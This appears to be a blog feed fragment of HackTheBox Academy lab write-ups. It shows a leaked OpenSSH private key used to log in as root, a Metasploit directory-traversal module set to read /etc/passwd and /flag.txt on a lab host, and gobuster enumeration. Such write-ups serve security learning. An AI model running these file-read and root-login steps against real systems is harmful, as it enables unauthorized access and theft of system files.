+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aPDP2xzFB0d0c7kZ8AtogtD3UYdiVKuF5fzOPJxJO1Mko7UsrhAh0T6mIBJWRljjUtHwSs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ntrFfE5trYET5L+ov5WSi+tyBrAfCcg0vW1U78Ge/3h4zAG8KaGZProMUSlu3MbCfl1uK/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EKQXxCNIyr7Gmci0pLi9k16A1vcJlxXYHBtJg6anLntwYVxbwYgYXp2Ghj+GwPcj2Ii4fq
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ynRFP1fsy6zoSjN9C977hCh5JStT6Kf0IdM68BcHAAAFiA2zO0oNsztKAAAAB3NzaC1yc2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EAAAGBALd51+ewdWdp0h2Pmmo+JSrfZcni1TYhYe19L0IrMaD7/QYzaaUMVT7UPHLLx6vx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mrYEqPKFcrJGSEW1m+0LwkCOybE/j6+InkGsjSKA5uvovRdYV8jHNFbAKjJNOc/WCkrS5m
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tIjepfNTK9HQCOt8dJrcESnh7yUfhIjLVE5QF/fvpECZg/Rd5Q0pyxeP3RMhuFkEgB+xfC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">c9zq0Si6awYg39uy0j4Dieo/Di5+G7ImnGlhQZd/gqpF3hpHnBB4OXSC+Cvmjwz9scxQdH
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dHO5GfALaILQ91GHYlSrheX8zjycSTtTJKO1LK4QIdE+piASVkZY41LR8ErJ7axXxOba2B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">E+S/qL+VkovrcgawHwnINL1tVO/Bnv94eMwBvCmhmT66DFEpbtzGwn5dbivxCkF8QjSMq+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xpnItKS4vZNegNb3CZcV2BwbSYOmpy57cGFcW8GIGF6dhoY/hsD3I9iIuH6sp0RT9X7Mus
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6EozfQve+4QoeSUrU+in9CHTOvAXBwAAAAMBAAEAAAGAMxEtv+YEd3kjq2ip4QJVE/7D9R
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I2p+9Ys2JRgghFsvoQLeanc/Hf1DH8dTM06y2/EwRvBbmQ9//J4+Utdif8tD1J9BSt6HyN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">F9hwG/dmzqij4NiM7mxLrA2mcQO/oJKBoNvcmGXEYkSHqQysAti2XDisrP2Clzh5CjMfPu
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DjIKyc6gl/5ilOSBeU11oqQ/MzECf3xaMPgUh1OTr+ZmikmzsRM7QtAme3vkQ4rUYabVaD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2Gzidcle1AfITuY5kPf1BG2yFAd3EzddnZ6rvmZxsv2ng9u3Y4tKHNttPYBzoRwwOqlfx9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PyqNkT0c3sV4BdhjH5/65w7MtkufqF8pvMFeCyywJgRL/v0/+nzY5VN5dcoaxkdlXai3DG
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5/sVvliVLHh67UC7adYcjrN49g0S3yo1W6/x6n+GcgCH8wHKHDvh5h09jdmxDqY3A8jTit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CeTUQKMlEp5ds0YKfzN1z4lj7NpCv003I7CQwSESjVtYPKia17WvOFwMZqK/B9zxoxAAAA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wQC8vlpL0kDA/CJ/nIp1hxJoh34av/ZZ7nKymOrqJOi2Gws5uwmrOr8qlafg+nB+IqtuIZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pTErmbc2DHuoZp/kc58QrJe1sdPpXFGTcvMlk64LJ+dt9sWEToGI/VDF+Ps3ovmeyzwg64
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+XjUNQ6k9VLZqd2M5rhONefNxM+LKR4xjZWHyE+neWMSgELtROtonyekaPsjOEydSybFoD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cSYlNtEk6EW92xZBojJB7+4RGKh3+YNwvocvUkHWDEKADBO7YAAADBAPRj/ZTM7ATSOl0k
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TcHWJpTiaw8oSWKbAmvqAtiWarsM+NDlL6XHqeBL8QL+vczaJjtV94XQc/3ZBSao/Wf8E5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">InrD4hdj1FOG6ErQZns6vG1A2VBOEl8qu1r5zKvq5A6vfSzSlmBkW7XjMLJ0GiomKw9+4n
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vPI0QJaLvUWnU/2rRm7mqFCCbaVl2PYgiO6qat9TxI2y7scsLlY8cjLjPp2ZobIZN5tu3Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">34b8afl+MxqFW3I5pjDrfi5zWkCypILwAAAMEAwDETdoE8mZK7wOeBFrmYjYmszaD9uCA/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">m4kLJg4kHm4zHCmKUVTEb9GpEZr1hnSSVb+qn61ezSgYn3yvClGcyddIht61i7MwBt6cgl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ZGQvP/9j2jexpc1Sq0g+l7hKK/PmOrXRk4FFXk+j6l0m7z0TGXzVDiT+yCAnv6Rla/vd3e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----END OPENSSH PRIVATE KEY-----
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>I copy the key to my local machine in a file named id_rsa and save it, then try to use it to log in as the root user using the commands:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">──(papab3ar㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ssh root@94.237.49.11 -p 31973 -i id_rsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Let me break this command down in bits:
+&lt;strong>ssh&lt;/strong>: This is the command used to start an SSH connection.&lt;/p>
+&lt;p>&lt;strong>&lt;a class="link" href="mailto:root@94.237.49.11" >root@94.237.49.11&lt;/a>&lt;/strong>: This specifies the username and IP address of the remote server. In this case, the username is &amp;ldquo;root,&amp;rdquo; and the IP address is &amp;ldquo;94.237.49.11.&amp;rdquo;&lt;/p>
+&lt;p>&lt;strong>-p 31973&lt;/strong>: This option specifies the port number to use for the SSH connection. The port number is set to &amp;ldquo;31973.&amp;rdquo;&lt;/p>
+&lt;p>&lt;strong>-i id_rsa&lt;/strong>: This option specifies the identity (private key) file to use for authentication. In this case, the private key file named &amp;ldquo;id_rsa&amp;rdquo; is being used for authentication.
+of-course we gain access to the machine as the root user as we get the welcome banner like we got during our initial access with the root user&amp;rsquo;s shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~#
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So now we just list directories and read the contents of the &lt;em>flag.txt&lt;/em> file.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTB{pr1v1l363_**********_2_r007}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.&lt;/p>
+&lt;p>Remember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.&lt;/p>
+&lt;p>dr0idbot signing off.&lt;/p></description></item><item><title>Public Exploits</title><link>https://hushkat.github.io/p/public-exploits/</link><pubDate>Wed, 02 Aug 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/public-exploits/</guid><description>&lt;img src="https://hushkat.github.io/p/public-exploits/Metasploit.png" alt="Featured image of post Public Exploits" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Welcome to yet another writeup where I cover an important tool used by hackers to exploit vulnerabilities on different systems: &lt;a class="link" href="https://www.metasploit.com/" target="_blank" rel="noopener"
+>Metasploit&lt;/a> In this challenge, part of the &amp;ldquo;Getting started&amp;rdquo; series on HackTheBox Academy, we will be delving into the realm of public exploits and uncovering the power of Metasploit.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="public-exploits-challenge">Public exploits Challenge.
+&lt;/h3>&lt;p>The challenge instructions were simple: &amp;ldquo;Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the &amp;lsquo;/flag.txt&amp;rsquo; file.&amp;rdquo; The main focus of this challenge is to demonstrate the ability to identify vulnerabilities and effectively exploit them. Let&amp;rsquo;s begin our journey by examining the target IP address and visiting the associated webpage.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits.jpg"
+width="1015"
+height="252"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits_hu17449750365477643856.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits_hu11126079795141998931.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="402"
+data-flex-basis="966px"
+>&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Upon accessing the webpage, the very first thing that caught our attention was a version number and a brief description of a WordPress service. Drawing from our knowledge of how to find and exploit publicly available vulnerabilities, we swiftly launched the Metasploit console to search for an exploit relevant to this specific version.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits0.jpg"
+width="1918"
+height="800"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits0_hu16881979783332079574.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits0_hu14133496900036993840.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="239"
+data-flex-basis="575px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">──(dr0idbot㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$msfconsole
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- - - - - SNIP - - - - -
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; search exploit wordpress 2.7.10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Modules
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">================
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # Name Disclosure Date Rank Check Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 auxiliary/scanner/http/wp_simple_backup_file_read normal No WordPress Simple Backup File Read Vulnerability
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 &amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Metasploit came back with results, indicating that there is a publicly available exploit matching the version we found on the website.&lt;/p>
+&lt;p>Notice the command used to spin up metasploit &lt;strong>msfconsole&lt;/strong> after its up and running, we run the command &lt;strong>search exploit wordpress 2.7.10&lt;/strong> to see if there are any publicly available exploits for this plugin version. Sure enough, metasploit brings back results and slight description of what we are looking for matching the info on the website we had visited earlier on.&lt;/p>
+&lt;p>We have an option to see information about that exploit before using it, to see what they payload does. For that we use the command &lt;strong>info&lt;/strong> plus the index of the exploit itself.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; info 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Basic options:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DEPTH 6 yes Traversal Depth (to reach the root fold
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> er)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> FILEPATH /etc/passwd yes The path to the file to read
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port[
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ,type:host:port][...]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host(s), see https://docs.me
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tasploit.com/docs/using-metasploit/basi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cs/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT 80 yes The target port (TCP)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SSL false no Negotiate SSL/TLS for outgoing connecti
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ons
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TARGETURI / yes The base path to the wordpress applicat
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ion
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> THREADS 1 yes The number of concurrent threads (max o
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ne per host)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VHOST no HTTP server virtual host
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Description:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> This module exploits a directory traversal vulnerability in WordPress Plugin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;Simple Backup&amp;#34; version 2.7.10, allowing to read arbitrary files with the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> web server privileges.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- - - - - SNIP - - - - -
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As you can see, a bunch of information is given about this particular exploit with a number options that we need to set in order for the payload to work on our target. Next we use the command &lt;strong>use&lt;/strong> plus the index of the exploit we have picked for the exploitation. After selection we set the options that are required by metasploit before executing the payload.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; use 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set FILEPATH /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set RHOSTS 94.237.49.11
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set RPORT 41884
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After obtaining information about the exploit, including the required options, we set the necessary values to ensure the payload will work against our target.
+With all the options set, we verified the details and executed the payload on the target.&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>Upon successful execution of the payload, the Metasploit console provided us with the following output:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] File saved in: /home/papab3ar/.msf4/loot/20230803014901_default_94.237.49.11_simplebackup.tra_422018.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Scanned 1 of 1 hosts (100% complete)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Auxiliary module execution completed
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Using the command &lt;strong>cat&lt;/strong>, we accessed the directory where the file was saved and retrieved the contents of the flag, thus completing the challenge.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits1.jpg"
+width="664"
+height="134"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits1_hu129630161148891722.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits1_hu12755825758852016865.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="495"
+data-flex-basis="1189px"
+>&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>Metasploit proved to be a powerful tool during this challenge, allowing us to search for and exploit publicly available vulnerabilities effortlessly. It demonstrates the significance of staying vigilant against potential threats and the importance of secure coding practices for developers.&lt;/p>
+&lt;p>For a deeper understanding of Metasploit and its capabilities, you can refer to its official documentation &lt;a class="link" href="https://docs.metasploit.com/" target="_blank" rel="noopener"
+>here&lt;/a>&lt;/p>
+&lt;p>In conclusion, this challenge provided an excellent opportunity to apply web enumeration techniques, uncover hidden information, and identify potential vulnerabilities. As ethical hackers, the quest for knowledge and continuous learning is paramount. Happy hacking, and never stop learning!&lt;/p>
+&lt;p>dr0idbot out.&lt;/p></description></item><item><title>Web Enumeration</title><link>https://hushkat.github.io/p/web-enumeration/</link><pubDate>Sat, 29 Jul 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/web-enumeration/</guid><description>&lt;img src="https://hushkat.github.io/p/web-enumeration/Web.jpg" alt="Featured image of post Web Enumeration" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Hello friend :) I know it has been a while but, welcome to another writeup from a challenge discovered at one of the best learning platforms for hackers &lt;a class="link" href="https://academy.hackthebox.com/" target="_blank" rel="noopener"
+>HackTheBox&lt;/a>. This challenge is part of the &lt;strong>Getting Started&lt;/strong> module and can be found &lt;a class="link" href="https://academy.hackthebox.com/course/preview/getting-started" target="_blank" rel="noopener"
+>here&lt;/a>. It is an excellent starting point for those interested in offensive security or red teaming.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="web-enumeration-challenge">Web Enumeration Challenge.
+&lt;/h3>&lt;p>&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration.jpg"
+width="1018"
+height="261"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration_hu8515057553585735834.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration_hu11465272349736749952.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="390"
+data-flex-basis="936px"
+>
+The challenge instructions were straightforward: &amp;ldquo;Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.&amp;rdquo; The focus of the challenge was to apply web enumeration techniques to assess the security of websites. By copying the target IP address and visiting the associated webpage, We are greeted with some welcome text to the &amp;ldquo;HTB blog page&amp;rdquo;.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration0.jpg"
+width="1920"
+height="878"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration0_hu16122848629764167035.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration0_hu8267798658238640275.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="218"
+data-flex-basis="524px"
+>&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Upon first inspection, there wasn&amp;rsquo;t much information visible on the webpage. My next step was to inspect the page&amp;rsquo;s underlying code, which is often a good starting point for such challenges. Unfortunately, even after inspecting the code, I didn&amp;rsquo;t find anything substantial. So, I decided to leverage the tool &lt;a class="link" href="https://www.kali.org/tools/gobuster/" target="_blank" rel="noopener"
+>gobuster&lt;/a> to perform a brute-force attack on the website and find other directories.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration1.jpg"
+width="1920"
+height="516"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration1_hu15035713072342324124.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration1_hu3462159937791897608.jpg 1024w"
+loading="lazy"
+alt="Gobuster bruteforce"
+class="gallery-image"
+data-flex-grow="372"
+data-flex-basis="893px"
+>&lt;/p>
+&lt;p>This approach paid off as I discovered a directory. Navigating this directory revealed a page that appeared to be under construction, possibly an incomplete WordPress site.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration2.jpg"
+width="1920"
+height="878"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration2_hu2192201098653058149.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration2_hu16459381043555446653.jpg 1024w"
+loading="lazy"
+alt="Wordpress"
+class="gallery-image"
+data-flex-grow="218"
+data-flex-basis="524px"
+>&lt;/p>
+&lt;p>Once again, I decided to inspect the page&amp;rsquo;s code, hoping to find something useful. This time, I stumbled upon a section related to web crawlers. Web crawlers, also known as spiders or spiderbots, systematically browse the World Wide Web on behalf of search engines for indexing purposes. Websites often use a file called robots.txt to instruct or block these crawlers from accessing certain web directories.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration3.jpg"
+width="1920"
+height="500"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration3_hu8448233419615401878.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration3_hu953760390495453459.jpg 1024w"
+loading="lazy"
+alt="wordpress inspection"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;p>Armed with this knowledge, I attempted to access the robots.txt file to view its contents.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration4.jpg"
+width="1920"
+height="300"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration4_hu6422896200408462688.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration4_hu3405148104871446228.jpg 1024w"
+loading="lazy"
+alt="robots.txt"
+class="gallery-image"
+data-flex-grow="640"
+data-flex-basis="1536px"
+>&lt;/p>
+&lt;p>Once again, I inspected the code of this page and came across some interesting comments. It seemed that the web developer forgot to remove the comments containing login credentials for the admin user.
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration5.jpg"
+width="1920"
+height="500"
+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration5_hu154472781002745671.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration5_hu1116697367029928119.jpg 1024w"
+loading="lazy"
+alt="admin login"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;p>Page code inspection follows:
+&lt;img src="https://hushkat.github.io/p/web-enumeration/WebEnumeration6.jpg"
+width="1920"
+height="500"
